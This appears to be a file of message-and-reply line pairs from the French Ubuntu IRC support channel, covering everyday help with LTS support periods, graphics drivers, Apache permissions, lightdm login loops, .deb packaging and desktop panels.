:(	xchat est en GTK et ne dépend pas de bibliothèque particulière étrangère à GNOME
en fait, je viens de trouver les options serveurs :p	xchat-gnome est une version apauvrie de xchat
là je le retrouve pas sous Ubuntu	dpkg -l | grep xchat ?
voilà, c'est chaud Zic (mine de rien)	c'est pour ça qu'officiellement, seul les Ubuntu classiques sont LTS
il ne faut pas les utiliser	bein, si il part de l'iso officielle, officiellement, on va prendre le cas de la 14.04, tu as un support pour la version officielle jusque en Avril 2019, le paquet lubuntu-desktop lui reste disponible, tu vois Zic ? ses gets arriverons à destination, car l'o/s lui même ne sera pas en EOL en 2017
apt-get	bah, il n'arrivera plus à get ses paquets en fait, donc il se dira au moins qu'il y a un problème
ok Zic et l'utilisateur est prevenu de ça Zic ?	oui, l'update-manager s'en charge normalement, à voir comment ont géré ça les mecs de Lubuntu (aucune idée)
et là, on parle uniquement de LTS, pour les versions standards, c'est 9 mois pour tout le monde	ok, et le paquet lubuntu-desktop, il reste toujours diponible dans universe restricted (qui est actif par défaut), même si ils offrent plus les màjs de securité ?
ok, et le paquet lubuntu-desktop, il reste toujours diponible dans universe restricted (qui est actif par défaut), même si ils offrent plus les màjs de securité ?	dans universe oui
que unity , hummm humm	ta quel version d'ubuntu ?
nop pas tout à fait	et pour xubuntu combien d'années de support côté lts ?
j'confirme, 3ans de LTS pour Lubuntu	et pour les changements qu'il y'a pu avoir entre la 14.04 et la 14.10 tu as mon url
glxgears n'est pas un benchmark	bein c'est qu'un frontend à des commandes phoronix non ?
fun ≠ graphismes	un glxgears te donne quoi ?
ajoute nouveau, tu verras bien si ça résout ton souci ^^	le résultat est le même, cependant, avec un quiet splash nomodeset … je vois l'image du splashscreen, qui merdoie un peu sur la fin … mais bon :x
écran noir	peut être donc que l'initramfs ne load pas le driver nvidia concernant plymouth (donc black screen), et il redonne pas la main à lightdm ou je sais plus ce qu'il y'a dans kde
dans mon cas	as tu un tty ?
ajouter(*)	ce sont les modules chargés par l'initramfs, et donc disponibles pour plymouth
les pilote proprio nvidia ne fonctionne pas avec la 15.04	tu as logiquement plusieurs versions de nvidia 304 310 313 319 etc, si ça passe pas avec un, tu essayes avec un autre
je vais mettre du temps à regarder la 15.04, et quand je le ferai, je commencerai par virer systemd, donc pas sur que tu veuilles mes conseils :)	tout conseil est bon à lire, même sans en tenir compte ^^
un petit sysctl -p (*)	encore plus propre qu'éditer sysctl.conf serait de créer un fichier dédié à tes modifications dans /etc/sysctl.d/ :)
encore plus propre qu'éditer sysctl.conf serait de créer un fichier dédié à tes modifications dans /etc/sysctl.d/ :)	comment ça ?, je peux en savoir plus ? :)
bon je vous laisse un moment je vais m'aerer...	laisse tomber, ça ne fait rien avancer
/nick limacedu25 ?	peux tu éviter ce genre de remarque je te prie
dat troll	tu disais ?
j'aurais prefere un dual boot avec w7 ou w8.1 mais trop tard	tu as peut-être une partition de restauration (de w8)..
je fait des copier coller dans reverso avant d envoyer les mails pro , ca me saoul	ah si, mais c'est pas une application, mais plus un libre
non mais j en ai un mais il est m**ique	je doute qu'il existe un equivalent
ah ok et ça veut dire quoi concretement ?	ça retourne quoi ?
une barre d'adresse ?	bein qu'as tu effectué sur ta machine ? le repertoire que j'ai cité existe sous Ubuntu 14.04
il me dit toujours : aucun fichier ou dossier de ce type	..
http://doc.ubuntu-fr.org/correction_orthographique#thunderbird orogor	 je n'arrive pas a paster pourtant j'ai lu le tuto
 je n'arrive pas a paster pourtant j'ai lu le tuto	vois tu ce qu'est une barre d'adresse ?
oui la version 14.04 LTS	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
et c'est la reponse qui m'est donnee	peux tu coller le résultat de cette commande dans un pastebin : ls /usr/share/applications/
!wiki terminal	http://doc.ubuntu-fr.org/openbox
thank you	 je vois bien l'icone de skype dans mes applications, mais quand je clique dessus rien ne se passe
please speak French or go on the channel #ubuntu escargotdu25	desole j'ai les 2 cannaux d'ouverts
j'ai une question : j'ai une version de ubuntu 14.04 et je souhaiterais installer et utiliser skype. est-ce possible et comment proceder ?	voilà pour ta réponse.
http://paste.ubuntu-fr-secours.org/src-143480	et sur uuid-dev ?
 uuid-dev : Depends: libuuid1 (= 2.20.1-5.1ubuntu20) but 2.20.1-5.1ubuntu20.3 is to be installed	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
j'aurai besoin d'aide pour regler un pb de paquet pété	apt-cache policy libuuid1
avelldiroll merci pour ton aide la je vais aller faire dodo je suis naze encore merci et bonne nuit !	bonne soirée
avelldiroll le probleme c'est qu'ils sont sous windows	et ? ils ont juste besoin de firefox (ou d'un navigateur compatible)
avelldiroll je suis arrive sur le site et ai pu me connecter et meme utiliser la cam, sauf que personne n'était connecté apparemment	il faut envoyer l'adresse aux gens avec qui tu veux communiquer
avelldiroll tout ça me semble compliqué	faut juste prendre son temps, aller à son rythme
Voulais offenser personne.  Je crois seulement que le Libre est L'alternative...	c'est le danger d'exprimer des suppositions sur un salon de support, pour ce genre de discussion, c'est sur l'offtopic qu'il faut aller
c'est le danger d'exprimer des suppositions sur un salon de support, pour ce genre de discussion, c'est sur l'offtopic qu'il faut aller	Merci du conseil
Sinon.  Instruis-moi	1/ c'est offtopic  2/ c'est pas comme si c'etait planqué comme info
J'invente quoi?  Le libre est l'oeuvre de mécènes et de passionnés.	nope, il y a beaucoup plus d'acteurs que ca dans le libre
avelldiroll j'ai bien firefox, comment proceder ?	apres tu peux faire du chat video avec quelques clients jabber, pidgin le supporte probablement, jitsi pour sur
de toute manière, microsoft vire IE de windows 10 (et le deguise en le renommant)	merci
merci	si tu ne sais pas, n'invente pas :)
ah ok je vois	pour un equivalent à skype ou hangout, regarde du coté de hello de firefox ou de rendez-vous de renater
emesene	comme Skype?
Avelldiroll, à noter tout de même que Spartan n'est pas une simple nouvelle version d'IE c'est bel et bien un nouveau navigateur	c'est discutable, et offtopic
je cherche a regler et utiliser des messageries instantanees comme pidgin, amsn ou emsen	As-tu une question précise?
j'y vais, a+	Merci Calinou
14.04 est un bon choix	Minecraft s'appuie sur LWJGL, une bibliothèque libre… utilisant du code natif
Minecraft s'appuie sur LWJGL, une bibliothèque libre… utilisant du code natif	Du code natif multi-plateformes?  Là, j'en prends un coup!
bonsoir je suis novice sur ubuntu et j'ai telecharge la version 14.04 j'ai quelques questions quelqu'un peut-il m'aider ?	Bienvenue
Bonsoir à tous, je cherche un logiciel avec rendu en direct pour faire de l'HTML sous ubuntu. Quelqu'un peut m'aider?	il y a Aptana Studio pour ça
pas plus que Minetest le doit à C++	de nos jours les Web devs visent soit IE 8, soit IE 9 ; dans des projets libres, certains ne visent que Chromium / Firefox voire juste Chromium
Minecraft est en Java.  C'est bien le cas pour minetest?	non c'est du C++ minetest, ca doit être beaucoup plus leger pour le coup
non c'est du C++ minetest, ca doit être beaucoup plus leger pour le coup	tu dis que Minetest n'est pas multiplateforme à cause de Java.  C'est une sorte de X ou quoi?
tu dis que Minetest n'est pas multiplateforme à cause de Java.  C'est une sorte de X ou quoi?	merci de ne pas me faire dire ce que je n'ai pas dit :/
Reste Google...   Pas facile!	d´où je parle que c'est pas multiplateforme ?
Je voulais dire que les bienfaiteurs privés du libre (oracle, sun) .... bref je suis heureux que le Libre ait tant de répondant!	non, IE est un boulet que trainaient les webdevsdepuis longtemps, le support d'IE6 etait inomable
car le Java moderne est bien mieux	Et lorsque tu parles de IE.  Est-ce à dire que Firefox suit pas?
certains développeurs n'essaient pas de garder la compatibilité avec les anciennes versions du tout	Pour minetest.  Devrais-je muter vers java 8?
or j'ai un jeu qui dépend de Java 8 (Terasology) :/	la question est pourquoi quelqu'un qui n'est ni dev, ni beta tester voudrait un java 8 ?
les mêmes qui se plaignent que les paquets sont pas à jour :p	ca fait longtemps que le nombre de devs dans le libre est stable, pareils pour les beta testeurs, et je dirais que ca va faire 4 à 5 ans que seules les installation LTS sont en croissance sur le Desktop, et c'est normal, il y a grosso modo toujours la meme proportion de devs et d'early adopters dans la population, c'est juste que linux en general et ubuntu en particulier touche maintenant une
les entreprises sont censées utiliser le LTS, je parlais des particuliers.	Serait-ce vrai qu'en fin de session universitaire, nous obtenions mille mises-à-jour totalement prometteuses et avant-gardistes... mais pas nécessairement au point.  Qu'il faut attendre un peu avant de toutes les appliquer?
Est-ce vraiment offtopic?	j'ai cru bien faire en allant sur offtopic ... enfin il n'y a personne !
j'ai cru bien faire en allant sur offtopic ... enfin il n'y a personne !	moi, ça me dérange pas
sur la synthèse vocale... me recommanderiez-vous MBROLA ?	crossposter c'est toujours une mauvaise idée, ca divise les discussions, la reaction des gens c'est toujours de se dire que quelqu'un repondra à la question ailleurs, donc ca sert à rien de se lancer
crossposter c'est toujours une mauvaise idée, ca divise les discussions, la reaction des gens c'est toujours de se dire que quelqu'un repondra à la question ailleurs, donc ca sert à rien de se lancer	tu parles de ubuntu-fr-offtopic ?
non	"le nombre d'utilisateurs de non-LTS n'augmente pas" <-- euh, c'est normal, voulu et assumé
mais le nombre d'utilisateurs de non-LTS n'augmente pas, voire il diminue	pardon tu me réponds ? et sinon quoi ?
qui peut me dire si Lubuntu 15.04 est en version LTS ?	le "L" dans Lubuntu correspond à l'environnement graphique, soit LXDE.
du coup niveau garantie ils doivent être moins pénibles chez dell ?	ça ne pose généralement aucun problème, pour les deux
ma femme a besoin d'un ordi portable pour travailler. nous envisageons d'installer une distribution linux (probablement ubuntu) sur cette machine. Je cherche donc des conseils pour acheter une machine qui fonctionnerait bien sans prise de tête pour installer et configurer la machine	http://www.ubuntu.com/certification/desktop/ :)
*dossier	a quoi tu penses?
https://www.pstk.fr/pub/2015-04-22-155830_1199x713_scrot.png	tu peux poser ta question en une seule phrase sur une seule ligne ?
Ok, vais voir. Merci pour tous vos conseils :-)	mais attends
et t'as fait quoi aujourd'hui dessus ?	rien de spécail , relevé mas mails
c'est pas un problème de locale ?	c'est-à-dire ?
m'enfin c'est chelou	on se dirige vers de l'offtopic :D
Bonjour à tous. Help ! Desktop manager  marche pas	il nous faudra plus d'informations pour t'aider
oui	il est chez ovh :)
Je vais certainement retourner sur Debian de toute façon, vu l'expérience sur Mint	les solutions sous Ubuntu fonctionnent sous Mint, c'est pas impossible, mais il faut savoir que les chemins absolus ne sont pas les même par exemple
on est sur #ubuntu-fr, pas sur #ubuntu-fr-troll	:D c'est offtopics :p
d'ailleurs je me demande comment cette distro fait pour être top 1	une belle connerie http://www.howtogeek.com/176495/ubuntu-developers-say-linux-mint-is-insecure-are-they-right/ (et pas que)
on a régulièrement des personnes qui ont des soucis sur Ubuntu, et qui s'avèrent causés par des PPA (donc pas propres à Ubuntu)	je sais bien, c'est juste qu'en général les solutions sous Ubuntu fonctionnent parfaitement sur Mint, et vu la taille de communauté différente j'ai pensé que c'était mieux de me tourner vers celle d'Ubuntu
Ok	Mint a son propre dépôt de packages non?
Mint a son propre dépôt de packages non?	Oui mais il utilise 90 0e package ubuntu
-_-	basé sur ne veut pas dire que c'est identique, sinon, ça n'existerait pas :)
merci pour la précision Zic	de rien, je croyais aussi que c'était un alias à l'origine donc j'ai creusé :)
bonjour, est-ce que c’est ici que je peux poser des questions sur les Ubuntu Party où il y a un canal plus adéquat?	#ubuntu-fr-party ou #ubuntu-fr-aso
#ubuntu-fr-party ou #ubuntu-fr-aso	merci beaucoup :)
 mais c'est pas evidant  je debute sous xubuntu	s/xchat/irc/ ne pas confondre client et protocole
s/N/?/	une idée?
Si vous avez des idées je suis preneur :)	Java IcedTea ou Java Oracle N
ou bon, ok... c'est plus complexe... ya tellement de couches successives qui interpr^etent partie de la ligne de commande...	au final find est la commande, les options -type -exec etc sont les options de la commande find
à quoi ça correspond ce + gniourf ?	ça évite d'appeler ta commande pour chaque argument trouvé
ah ?	pour dire à find d'executer une seule fois la commande avec tous les arguments trouvés
ok apres tout du moment que ça marche...	ce que tu fais avec find est la bonne solution
thanks bro	il est géré par NetworkManager dans les éditions Desktop
pourquoi*	il est mis à jour par dhclient !
http://httpd.apache.org/docs/2.4/fr/upgrading.html#run-time <= doc que j'ai dû filer aux devs :D	;)
ouais le dossier Dropbox est mal gaulé comme permissions	essaie un sudo a2enmod mod_access_compat && sudo service apache2 restart
tRavail	tu n'aurais pas des .htaccess qui traînent avec des choses d'Apache 2.2 ?
14.04	dans ton /etc/apache2/apache2.conf, cherche un Require all
bon ok :-) je ressère la ceinture	désolé j'ai pas suivi, c'est quelle version d'Ubuntu Server ?
mais là m^eme a 777 partout j`ai  [core:error] [pid 1210] (13)Permission denied: [client 127.0.0.1:33512] AH00035: access to /arya denied (filesystem path '/home/jluc/Dropbox/WEBDEV') because search permissions are missing on a component of the path	certains process refusent de s'exécuter quand il y a trop de droits
genre 777	par défaut, j'aurais plutôt mis 644 sur les fichiers et 755 sur les répertoires
le mieux, c'est quand tu as une puce qui gère le watchdog matériel dans ta machine (comme sur le SheevaPlug), puisque c'est carrément un reboot matériel en cas de blocage complet du système :)	Merci ;)
@Marmotte, dommage, je vais donc devoir attendre ce soir pour bosser sur mon petit serveur :(.	pour une prochaine fois, tu peux regarder du coté du watchdog
il n'a probablement pas le droit de toucher au reste du système :)	ah c'est bon ça fonctionne :)
J'aurais besoin de savoir si il existe une commande depuis windows pour redémarrer a distance (réseau local) un poste linux? Le poste en question répond au ping, mais plus de partage ni de connexion ssh d'accessible.	ça n'existe pas à ma connaissance, et je considèrerais plutôt ça comme une faille :D
puisque ton htaccess est dans un répertoire précis	c'est un serveur dédié je peux tout modifier
ah	j'ai même testé aussi AllowOverrideList All
salut j'ai un problème de config sous apache si une personne peut me donner son avis : http://pastebin.com/4rSuAA76 (merci) | message d'erreur dans log :   /var/www/public/.htaccess: <Directory not allowed here	http://httpd.apache.org/docs/2.2/mod/core.html#allowoverride
http://httpd.apache.org/docs/2.2/mod/core.html#allowoverride	pourtant j'ai mis AllowOverride All dans mon code
car il y a plein de fichiers de configs en plein dendroits	les configurations sont dans /etc/apache2/sites-enabled pour apache2
j,ai l,impression que le localhost regarde pas au bon endroit	regarde les logs d'apache, et les configurations de vhosts
trop récent	oui c'est pas systematique, mais bon quand même..
quelqu'un sait quand le kernel 4.0 sera disponible de maniere native sous Ubuntu ? à partir de quelle version ? -bis	je pense pas avant un petit moment
lu. Je vais voir mes nveux/nièces cette semaine et je voulais jouer à un jeu en réseau avec eux. Vous avez des idées de jeu ? sauf fps et doom-like car ils sont un peu jeunes; la dernière fois j'avais joué à armagetron-ad	tuxkart
donc aucune raison de donner du support ici	dixit leur support
Oui	wat?
Et si c'est toi qui doit migrer l'application, c'est donc toi l'expert, pas nous :-)	c'est libre je pense
ouvre un blog	dans un twitt ça rentre
dans un twitt ça rentre	Twitter c'est du microblogging
par contre, la feature dont parle beaver, ouais, c'est mieux	je confonds avec kexec
tarte à la crème	c'est pas sans reboot :p
faire des màjs libc & kernel sans reboot	KSplice
arf :D	tab existe, sinon :)
tab existe, sinon :)	techniquement mon client IRC ne peut autocompleter quelque chose qui connait pas :(
https://www.youtube.com/watch?v=_lX5eyNxfJ8 ( Claude François  Le Mal Aimé   )	as tu une question concernant Ubuntu ?
pourtant dans la pub 118 218 j'ai cru voir une Marmotte qui dance :p	non
il existe un chan raspbian fr ?	ici, c'est #ubuntu-fr, pas un annuaire
mais je veux bien une maniere plus propre	fait un apt-get source irssi
je dois sortir ? bon …	euh, c'est pas comme ça qu'on fait un .deb
euh, c'est pas comme ça qu'on fait un .deb	il fonctionne avec la logitheque :/
outch non merci Zic, avelldiroll ok, oui, donc en somme, comment puis je faire si je veux mettre à jour mon logiciel ? je dois reconstruire le deb ? comment ça se passe ?, dans mon cas l'aborescence et les deps logiciels ne changent pas	ca se passe qu'il ne faut pas mettre la charrue avant les bœufs, renseigne toi sur le packaging avant de t'inventer des problèmes avec, suit un tuto simple sur une appli simple, ca te permettra de voir les tenants et aboutissants
ca se passe qu'il ne faut pas mettre la charrue avant les bœufs, renseigne toi sur le packaging avant de t'inventer des problèmes avec, suit un tuto simple sur une appli simple, ca te permettra de voir les tenants et aboutissants	logiquement j'ai déjà la charrue, il me manque le/les boeuf(s) maintenant
mais packager sans packager, c'est pas possible	bein j'ai actuellement mon .deb la, j'ai effectué la chose suivante : mkdir monsoft , mkdir monsoft/DEBIAN , mkdir usr/bin , j'ai unzip mon zip dans monsoft/usr/bin, dans le dossier DEBIAN, j'ai un fichier preinst, postinst, prerm, postrm avec mes renseignements dedans
*mirroring	en somme oui, tu peux faire idem avec deux lignes de commandes et un server apache xD
Bien merci des indications, je me procurerai un clé usb demain et je réglerai ça	si il te faudra probablement une clef usb, juste en "live".
Mezen, vous êtes là ?	désolé, je ne peux continuer à suivre
Encrypted private directory is not setup properly	à ce moment là, repasses en mode normal et essaie meme si ça clignote fort
on dit chiffré, et non crypté, et encore moins encrypté :)	figures toi que c'est dans larousse
Driver=fglrx_pci latency=0	c'est toi qui l'as installé ?
Ça repond à ta question, mezen, ou il faut les autres infos aussi ?	oui mais sur la ligne configuration
eassayes une clef usb, ubuntu live. deja voir si ca trouve quelques chose sur disque dur.	on essaie de voir si on pouvait réinstaller le pilote graphique
J'ai un soucis, mezen, après redemarage, je n'ai meme plus la fenetre graphique  des password. Et ma console clignote tellement que j'ai du mal a entrer lmon password	tu peux redémarrer en mode recovery ?
Là, mon ecran clignote, passant toutes les deux seconde d'un affichage où je ne vois qu'un tiers de l'ecran à un ecran noir	c'est quoi comme carte et qu'est ce que tu utilises comme pilote ?
Bizarre, l'affichage graphique est instable (une partie de la fenetre s'affiche, clignotement), mais l'ecran est similaire  à celui avant.	c'est à dire ?
Je mets le gestionaire graphisue gdm  par defaut ?	temporairement oui
Le dist-upgrade est  passé, mais rien n'a ete chngé	<mezen> sudo apt-get remove --purge lightdm
Mezen, je n'ai pas compris. Quelle commande ?	tu peux refaire une mise à jour et redémarrer?
Le resultat  est le meme qu'avant. Il accepte mon password, fait un truc en arrière fond, puis reviens à la fenetre des mots de passe.	non pardon, t'as déjà répondu à beaver
Je viens de le faire. Là, il a executé la commande.	tu retournes le résultat de cette commande s'il te plaît
Là, ça renvoie le nom de mon repertoire /home/edouard	quelle version en fait?
Pwd renvoie un /	on. Maintenant on redémarre la session graphique, tape: sudo service lightdm restart
Mezen, elle ne renvoie rien	la commande "pwd" renvoie le répertoire courant
Mezen, où est-il ce fichier ? Dans mon home ou ailleurs ?	pwd ne te renvoie rien ?
(Je suis sorti de su)	dans ton /home/user/ normalement
Il dit qu'il n'y a pas de fichier .Xauthority	que rend elle la commande "pwd" ?
la Loghtithèque Ubuntu est intégalement faite en Python	via dpkg ça passe tout seul (dans le cas d'un .deb donc)
elle effae le fichier .Xauthority, qui est un fichier d'authentification	via un sudo un dpkg ça passe tout seul (dans le cas d'un .deb donc)
tu as chiffré ton disque dur ?	il a aussi des exigences à deux balles la logitheque du genre : Le paquet ne fournit pas un champ de contrôle de taille valide. Cf. politique Debian 5.6.20.
Donc j'efface xauthority ?	ça sert à rien ton "su"
Enfin, en principe, car la dernière mise à jour remettait à jour des fichiers systèmes auxquels je ne comprends rien.	t'as un shell root à cette heure ?
alors ton mot de passe est mauvais ?	ça n'empêche, elle vaut pas un clou
Grub se lance. Ensuite je vois la fenetre où je dois rentrer mon mot de passe. Je le fais. Rien ne se passe ensuite. Je suis ramené à la fenêtre des mots de passe des utilisateurs.	Ctrl+Alt+F1 pour aller dans une console, connecte toi puis tape "rm .Xauthority" puis "sudo service lightdm restart"
lol j en repars ;-)	pour quelles raisons?
ok merci .... ;-)	sinon installe ubuntu :)
salut à  tous , savez vous si il existe un salon en Francais sur Linux Mint ?	Salut. Aucune idée, demande plutôt sur leur salon: #linuxmint-help
Bonsoir, vous savez si il existe des chans d'aide php sur freenode ?	##php
je suis un peu perdu	t'as payé ton windows, tu devrais avoir un minimum de support de la part de microsoft
Le gros problème, c'est que wine a besoin d'ouvrir le .exe à partir de son répertoire d'origine. Un lanceur ne fonctionne pas. Mais j'ai un fort doute qu'il existe un moyen. J'vais quand-même aller voir sur les canaux wine, car c'est probablement en lien et cause.	https://code.google.com/p/wine-launcher-creator/
bizarre	pas très intuitif quand même
je viens de tester ici, et j'ai bien un texte qui s'affiche	avec :h j'ai l'aide mais ça ressemble à ce que vim donne
vim ?	tout ce qui est à base de vi:vi, vim, gvim etc je ne maitrise pas :(
tout ce qui est à base de vi:vi, vim, gvim etc je ne maitrise pas :(	pour une utilisation simple de vim, ca prend 30 minutes avec vimtutor, puis une heure pour te faire un petit vimrc adapté à ce que tu fais
et je n'ai pas eu de bug, à part un seul celui de nedit	oui, mais toi tu te debrouilles seul face à 99 0e tes soucis et tu sais faire un bugreport détaillé
moi je suis avec une beta aussi, mais une ubuntu "standard"	pourquoi pas, meme si c'est un peu desert, et comme je le disais, sur une beta, faut pas s'attendre à du support, plus des pistes d'exploration
typiquement, on installe une beta pour fixer des problemes soit même, et les repporté pour qu'ils soient fixés pour tout le monde dans la version stable	donc => #ubuntu-fr-testing ?
merci pour le conseil	notamment: mate-panel --reset --layout ubuntu-mate-indicators
je trouve pas d'aide	tu peux aussi essayer les commandes ici: https://ubuntu-mate.community/t/ubuntu-mate-14-04-lts-useful-information/25
ok merci	en même temps, de l'aide pour une version beta, c'est pas le truc le plus courant, une version beta, c'est là pour que des utilisateurs avertis fassent des tests, tentent de trouver des bugs, detaillent leurs occurences et reportent des rapports de bugs precis afin que ces bugs puissent etre fixés pour la release, y a pas grand monde qui s'interesse à fixer les soucis d'utilisation d'une beta
c'est où alors ?	peut etre qu'il faut une mise à jour, il y a 3 commandes commençant par sudo à taper dans un terminal
et ca ne change pas que la 15.04 n'est encore en beta	à partir de la 15.04 elle a été introduite dans les dépots officiels d'ubuntu: http://cdimage.ubuntu.com/ubuntu-mate/releases/15.04/beta-1/
:)	en fait, elle devient une variante officielle à partir de la 15.04
en fait, elle devient une variante officielle à partir de la 15.04	c'est confirmé ? parce que ca a d'jà été repporté 2 fois
c'est confirmé ? parce que ca a d'jà été repporté 2 fois	c'est ce qu'ils disent sur leur blog: https://ubuntu-mate.org/blog/
t'as une solution ?	dans un terminal, tu peux faire ça: sudo pkill mate-panel
je suis revenu	quel est ton statut là ?
c'est bon merci :)	ça se relance ?
oui	dedans, tape mate-panel --reset
pour info, j'ai ubuntu mate 15.04  normalement	ok et est ce que tu peux lancer un terminal ?
ouais mais j'ai ubuntu mate	quand tu fais Alt F2, t'as quoi ?
j'ai galéré avant de trouver un moyen d'aller sur internet sans tableau de bord	par ton tableau de bord, tu veux dire le bureau Unity: comme l'image ici https://doc.ubuntu-fr.org/unity ?
ça m'est arrivé il y a 10 minutes	regarde l'image ici et dis moi si tu peux atteindre ce stade quand tu démarres ton pc: https://doc.ubuntu-fr.org/lightdm
je m'y connais pas du tout désolé	et tu as fait quoi pour en arriver là?
bah oui	tu peux arriver jusqu'a l'interface de la session graphique ? là ou tu rentres ton mot de passe ?
en redémarrant mon ordinateur, mon tableau de bord a disparu :(	sur une porshe ?
alors que c'est une dépendance recommandée	lightdm n'a pas de hard depend sur unity, vu que xubuntu-desktop et lubuntu-desktop l'utilisent sans installer unity
lightdm n'a pas de hard depend sur unity, vu que xubuntu-desktop et lubuntu-desktop l'utilisent sans installer unity	aujourd'hui je garde tous les paquets, meme si je vois pas trop l'utilité de les laisser, à part l'aspect stabilité
pour éviter qu'il génère des confs en dépendant ?	non, meme sans unity, il les installe quand meme
il faut peut être ne pas avoir unity AVANT d'installer lightdm	y a purge pour ca
pour la simple raison que c'est plus élégant	slim est facile à personnaliser, ça pourrait te plaire
la dernière fois que je l'ai fait, il m'a tout cassé, j'ai du réinstaller le système	en partant de l'iso server, tu peux installer un desktop sans unity
en partant de l'iso server, tu peux installer un desktop sans unity	mais j'ai besoin de la session graphique, d'ou lightdm qui depend d'unity
mais j'ai besoin de la session graphique, d'ou lightdm qui depend d'unity	tu peux mettre slim
j'ai eu une microcoupure	c'était une boutade/troll sur le fait d'utiliser quassel vs xchat
t as meme pas besoin de proposer de patchs pour ca	pour rebondir sur unity, c'est pas possible de le retirer proprement, il y a beaucoup de dépendances mal gérées
désolé, il ne peut s'empecher de faire de la pub	tu peux lui demander de me rendre mes clubs de golf qu'il m'a taxé la dernière fois ?
et Windows bien sûr	pour ?
pour ?	c'est pas moi qui l'ai écrit, j'ai bill gates assis à coté de moi
donc y a tout le port à faire pour la version 10 pas seche	environ 300 lignes de diff une fois viré les commentaires etc ... à tout casser
"dans un coin" ? je la vois nulle part dans debian apres wheezy pour i386 et amd64	dans le svn
ca cible que kfreebsd pour jessie, et ca fail pour tout le reste dans sid	oui, ils ont gardé l'ancienne version compatible linux dans un coin mais sans backporter les patchs
:)	comme ça, hop, pas de bureau tout flashy
cela dit, le dernier fix a été mis en may 2014, c'est pas si vieux, donc le gars qui s'en occupe doit encore garder un oeil dessus	retire moi ce unity d'Ubuntu aussi
retire moi ce unity d'Ubuntu aussi	j'installe la version serveur puis openbox et tint2
:)	retires el toi meme
rien que le fait que la version dans sid soit un commit non tagué suggere fortement que c'est pas sec, donc je doute qu'il n'y ait rien à faire	dans tous les cas, moi, je l'utilise, donc autant que j'essaye de fixer ... au pire, mes patchs ne seront pas accepté, mais moi , a minima, j'en aurai l'usage
et leprojet a tenu 3 ans sans mainteneur	tu as raison
ca serait simple comme solution et ca reglerait tous les problemes d un coup	effectivement, c'est une possibilité
effectivement, c'est une possibilité	vraiment, ca serait le plus simple
mais je ne les utilises pas pour les mêmes choses	vu que t as l air de gerer grave en fs, tu veux pas essayer de passer mainteneur du paquet
enfin, ufsutils tu veux dire?	je parlais de ufsutils
http://fr.wiktionary.org/wiki/bugg%C3%A9	moins buggé, tu parles de ufs ou udf ?
et même plus	vu le niveau de tes commentaires, laisse moi en douter
tu bug	tu sais lire un rapport de bug ? ou tu as déjà codé un fs ?
et 4 ans pour de la corruption de data, bah ca fait pensé à un projet abandonné, donc qu'il disparaisse des depots n'est pas le truc le plus surprennant du monde	je veux pas dire, mais il n'y a que 2 bugs et une demande de fonction dans https://bugs.debian.org/cgi-bin/pkgreport.cgi?pkg=ufsutils;dist=unstable , et aucun de critique dans l'utilisation courante du fs
et permets de garder une gestion de droit, même si tu as une infra qui mélange du mac, du windows et du linux	avelldiroll, merci
ok, merci	fonctionne très bien sur les clefs usb
union des démocrates français?	un format destiné au cdrom alternatif à l'ISO
pour les ecanges, ext4 avec une petite partition fat contenant des driver ext pour windows et macos, ca permet de conserver les droits	sinon, il y a le format udf
sinon, il y a le format udf	lis un peu les bugs qui ont 4 ans et n'ont toujours pas de fix stable, avant de dire "y a des bug partout"
dans tous les cas ca flair pas la stabilité	tu connais beaucoup de fs avec aucun bugs de corruption ?
à mon avis c'est pas pour rien que ça a été retiré des dépots	ah, à ton avis, c'est pour quoi ?
erf , mauvaise idée de leur part, c'est un bon système de fichier, tant pis, je vais compiler les tools	sinon, tu peux le télécharger ici https://launchpad.net/ubuntu/trusty/+package/ufsutils
sinon, tu peux le télécharger ici https://launchpad.net/ubuntu/trusty/+package/ufsutils	ok, thx
bonsoir, quelqu un sait si il y a un moyen d augmenter le son sur tout le system? Un peu comme VLC qui peux pousser jusqu'à +400%	 Paramètres système / Matériel / Son -> Selectionne ton périphérique et clique la case: Autoriser au delà de 100%(peut déformer le son)
oui	Bonsoir !!, deplacer le repertoire Home sur le disue secondaire serait pas conseille ??
oui	aucun de mes alias n'est reconnu
pas de problème ?	il a patienté une heure, c'est déjà bien, à l'heure du repas ca peut arriver qu'il n'y ait personne, c'est pas grave, il reviendra ou trouvera de l'aide ailleurs, pas besoin de jurer
sur ce je dois filer, mais oui, tu peux coller ubuntu server dessus, installer opemmpi, lammpi et openmp depuis les depots et commencer à pousser ton code dessus, tu verras ce que ca tousse	Merci pour ton aide en tout cas :à
J'ai déjà la machine, c'est pour du calcul scientifique (type c++) dans un labo publique	donc donne les specs de la machine, ca ira plus vite … (et type c++ ca veut pas dire grand chose, c'est du calcul parallèle? distribué? du brutasse ou de la gestion de worflow ou de DB?)
donc donne les specs de la machine, ca ira plus vite … (et type c++ ca veut pas dire grand chose, c'est du calcul parallèle? distribué? du brutasse ou de la gestion de worflow ou de DB?)	La machine c'est une poweredge R910 monté avec des E7-8850   (pour le calcul, c'est du calcul parallèle)
:}	non, je pensais plus à bourriner du calcul matriciel, c'est pas subtil, rarement efficace et ca bouffe des ressources par contre ca peut souvent facilement s'optimiser avec de la FFT, et la FFT c'est le truc que les GPUs font pour pas cher
ça fait un peu fr_Cocorico, mais les anglophones penseront que c'est un jeu de mot "systemDEBrouille" :>	tu as besoin d'un WE long
tu as besoin d'un WE long	brutasse = make -j1 ?
/kick avelldiroll systemd is watching you	c'est dredi, je peux en parler avec sa vraie syntaxe
Linus disait que ça devrait passer en bidouillant le MAXSMP jusqu'à 4096	par insstance de kernel, sur un cluster tu n'as pas de limites coté OS (plutot, encombrement, energie, refri)
Pensez vous qu'il soit possible d'installer une ubuntu sur une machine 80 coeurs?!	où serait le probleme ?
je commence sur linux est plus precisement sur kubuntu derniere version sur un Asus x550CC j'ai 2 problemes le premier c'est le freeze de temps à autre je suis obligé de fermer mon ecran pour declancher la veille puis de l'ouvrir à nouveau pour ne plus etre bloque. Le 2eme probleme lorsque j'allume mon portable il faut dans la foulé le mettre en veille en fermant l'ecran pour activer le wifi	tu as un dual boot ?
non mais je plaisante	aaah
tu utilise ubuntu studio?	j't'ai parlé en privé si t'as des questions sur le double boot en EFI, mais j'crois que t'as pas vu.
@Sp4rky Qu'en pense tu?	df -h
@Sp4rky: 'est à dire? j'ouvre un terminal et je tape ce que tu viens d'écrire?	uname -r
@sp4rky: Peut tu m 'expliquer stp?	normalement, un sudo apt-get autoremove te fait ça
